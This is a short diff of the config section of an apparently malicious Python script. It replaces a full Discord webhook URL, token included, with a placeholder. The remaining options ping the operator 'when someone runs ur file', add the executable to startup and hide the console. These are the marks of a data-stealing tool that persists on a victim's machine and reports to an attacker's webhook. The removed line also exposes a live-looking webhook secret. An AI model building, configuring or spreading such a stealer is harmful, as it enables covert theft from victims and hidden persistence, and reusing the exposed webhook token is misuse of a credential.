@@ -2,7 +2,7 @@ import ctypes, time
 starttime = time.time()
 
 #config
-webhook = "https://discord.com/api/webhooks/1004450286322077696/JFrL9ap73jlinNSZRJ8QBmRQSFLzKycFzL9Y8no_UGhtifsY8yq8SGzHm4CLi4mW9w6h"#change webhook_here to ur webhook
+webhook = "webhook_here"#change webhook_here to ur webhook
 ping_on_run = True #get pinged when someone runs ur file (True/False)
 add_to_startup = True #adds exe file to startup (True/False)
 HideConsole = True #runs in the background (True/False)
